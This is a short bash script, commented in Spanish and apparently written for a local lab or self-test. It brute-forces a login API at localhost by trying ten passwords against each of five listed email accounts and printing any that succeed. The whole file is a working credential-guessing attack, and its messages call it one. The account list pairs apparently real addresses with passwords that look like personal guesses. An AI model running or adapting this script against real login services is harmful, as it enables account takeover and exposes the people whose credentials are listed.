#!/bin/bash

API="http://localhost:8000"
echo "=== TEST DE LOGIN ==="

# Lista de contraseñas para probar
passwords=(
    "Admin123" "MateooO143" "MAr1ana" "Lucho2016" "Them012"
    "123456" "test" "password" "admin" "1234"
)

# Correos de la base de datos
emails=("sebb@gmail.com" "ari@gmail.com" "mateo@gmail.com"  "theito@gmail.com" "luis@gmail.com")

echo "Probando ${#emails[@]} usuarios con ${#passwords[@]} contraseñas..."
echo ""

for email in "${emails[@]}"; do
    echo "En ataque a: $email"
    
    for pass in "${passwords[@]}"; do
        # Hacer la petición al login
        respuesta=$(curl -s -X POST "$API/login" \
            -H "Content-Type: application/json" \
            -d "{\"correo\":\"$email\", \"password\":\"$pass\"}")
        
        # Verificar si fue exitoso
        if echo "$respuesta" | grep -q "exitoso"; then
            echo "CONTRASEÑA ENCONTRADA: $email - $pass"
        else
            echo "NO ENCONTRADA: $pass"
        fi
    done
    echo "---"
done

echo "Se completo el ataque"